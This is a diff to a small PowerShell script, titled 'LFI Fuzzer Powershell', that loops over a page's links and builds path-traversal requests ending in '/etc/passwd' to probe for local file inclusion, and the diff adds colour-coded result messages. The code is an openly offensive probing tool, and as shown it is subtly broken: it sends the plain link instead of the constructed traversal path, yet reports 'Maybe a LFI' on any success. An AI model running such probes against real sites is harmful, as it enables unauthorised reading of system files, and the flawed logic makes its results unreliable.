@@ -1,7 +1,8 @@
 ﻿####################################################################################
 #@author - Jerome Themee
 #@version - 1.0
-#date - 12/15/2016
+#@date - 12/15/2016
+#@title - LFI Fuzzer Powershell
 ####################################################################################
 
 #check IE process open and close it
@@ -31,8 +32,9 @@ for($i=0;$i -le 15;$i++){
     $makeRequest = $link[$choice].href + ("/..") * $i + ("/etc/passwd")
     $makeRequest
     $targetUrl = [net.WebRequest]::Create($link[$choice].href)
-    $targetUrl.GetResponse()}
+    $targetUrl.GetResponse()
+    write-host -fore green "Maybe a LFI, have a look"}
     catch{
-        write-host "404 error, no LFI/RFI :=("
+        write-host -fore red "404 error, no LFI/RFI :=("
     }
 }
